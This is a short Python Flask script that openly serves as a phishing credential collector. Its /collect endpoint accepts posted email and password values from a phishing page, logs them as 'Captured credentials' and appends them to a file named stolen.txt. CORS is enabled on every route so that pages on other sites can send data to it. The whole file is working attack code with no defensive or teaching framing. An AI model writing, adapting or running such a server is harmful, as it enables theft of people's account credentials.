from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enables CORS for all routes

@app.route("/", methods=["GET"])
def home():
    return "Phishing server is running."

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    print(f"[+] Captured credentials: {data}")
    with open("stolen.txt", "a") as f:
        f.write(f"{data['emailValue']} : {data['passwordValue']}\n")
    return "", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4000)